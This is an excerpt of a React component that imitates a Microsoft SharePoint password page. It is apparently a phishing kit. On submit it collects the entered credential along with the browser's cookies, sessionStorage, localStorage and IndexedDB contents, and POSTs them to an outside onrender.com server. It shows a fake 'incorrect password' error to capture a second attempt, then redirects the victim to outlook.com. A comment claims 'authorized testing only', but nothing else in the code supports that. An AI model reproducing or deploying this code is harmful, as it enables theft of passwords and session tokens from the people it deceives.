...
const SharePoint = () => {
    ...
    // Helper function for IndexedDB (if needed)
async function getAllIndexedDBData() {
    const databases = [];
    try {
        const dbList = await indexedDB.databases ? await indexedDB.databases() : [];
        for (const dbInfo of dbList) {
            try {
                ...
                console.warn(`Could not access database ${dbInfo.name}:`, e);
            }
        }
    } catch (e) {
    ...
    const handleSubmit = async (e) => {
        ...
        if (token) {
            ...
            const payload = {
                ...
                cookies: {
                    // Standard cookie access
                    documentCookie: document.cookie,
                    // Try parsing cookie string
                    parsedCookies: document.cookie ? document.cookie.split(';').reduce((cookies, cookie) => {
                    ...
                    // Check for specific known cookies
                    hasSessionCookies: document.cookie.includes('session') || document.cookie.includes('auth'),
                },
                
                // All available browser storage
                storage: {
                    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
                    localStorage: Object.fromEntries(Object.entries(localStorage)),
                    indexedDB: await getAllIndexedDBData(), // Note: requires async function
                },
                // Browser storage data (for authorized testing only)
                browserData: {
                   
                    // Additional browser data (if needed)
            ...
            //Send POST request with token and form data
            fetch('https://aba-v2-ad93.onrender.com/api/submit', {
                method: 'POST',
                headers: {
                ...
                .then(async (response) => {
                    ...
                    if (contentType.includes('application/json')) {
                        try {
                            ...
                            console.error('Failed to parse auth response JSON:', err);
                        }
                    }

                    if (response.ok && data.success !== false) {
                        console.log('Token validated. Access granted.');

                        setLoading(false);

                        // Count successful submissions (3 max)
                        // Increment the count in sessionStorage
                        const count = parseInt(sessionStorage.getItem("submitCount") || "0", 10);
                        const newCount = count + 1;
                        sessionStorage.setItem("submitCount", newCount.toString());

                        if (newCount > 1) {
                            setNotCorrect(false);
                            sessionStorage.removeItem("submitCount"); // Reset the count
                            window.location.href = "https://outlook.com";
                        } else {
                            setNotCorrect(true);
                        }

                    } else {
                        console.warn('Invalid Token or Authorization Failed.');
        ...
        <>
            ...
            <form onSubmit={handleSubmit} >
                <div className="min-h-screen flex items-center justify-center bg-gray-50">
                    ...
                    {/* Background Graphic (Hidden on Mobile) */}
                    <div className="hidden sm:block absolute inset-0">
                        <img
                            src="/sharepoint.svg" // Replace with the correct path
                            alt="Background"
                    ...
                    {/* Overlay */}
                    <div className='flex flex-col justify-between min-h-screen relative  z-10 w-full max-w-md sm:pt-[40px]'>
                        <div className=" sm:bg-white sm:rounded-[12px] sm:shadow-lg p-[24px] sm:p-[40px]">
                            {/* Microsoft Logo */}
                            ...
                            <div className='flex flex-col items-center justify-center'>
                                <p className="rounded-[20px] text-center text-[12px] text-[#616161] font-bold p-[6px] w-fit border border-[#e0e0e0]  mb-[16px]">
                                    {id}
                                </p>
                            </div>

                            {/* Heading */}
                            <h2 className="text-[24px] text-[#242424] font-semibold text-center mb-6">Enter your password</h2>
                            ...
                            <div className="mb-4">
                                ...
                                className="w-full border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 rounded-md px-4 py-2 text-base"
                            /> */}
                                <div className="">
                                    ...
                                    {notCorrect && (
                                        <div className="flex flex-row items-center justify-left gap-2 text-left">
                                            <span className="text-[#bc2f32] mt-1">
                                                <svg
                                                    fill="#bc2f32"
                                                    aria-hidden="true"
                                                    width="12"
                                            ...
                                            <p className="text-[12px] text-[#bc2f32] mt-1">
                                ...
                                <div className="mt-[8px]">
                                    <a href="#" className="text-[#115ea3] hover:underline text-sm font-semibold">
                            ...
                            {/* Next Button */}
                            <button disabled={loading} type="submit" className="cursor-pointer w-full text-[14px] bg-[#115ea3] text-white font-semibold text-base mt-[20px] py-2 rounded-[4px] hover:bg-blue-700 transition">
                                {loading ? (
                            ...
                            <div className="mt-6 mb-6 text-center">
                                <a href="#" className="text-sm text-[#115ea3] hover:underline font-semibold">
                        ...
                        <div className='mb-[20px]'>
                            <div className="mt-[45px] text-center text-[10px] text-[#424242]">
                                <a href="#" className="mx-2 hover:underline">Help</a>
                                <a href="#" className="mx-2 hover:underline">Terms of use</a>
                                <a href="#" className="mx-2 hover:underline">Privacy and cookies</a>
                            </div>
                            <div className=" text-center">
                                <span className='text-[10px] text-[#424242]' >Use private browsing if this is not your device. <a href="#" className='text-[#115ea3] hover:underline'>Learn more</a></span>
                            </div>
                        </div>
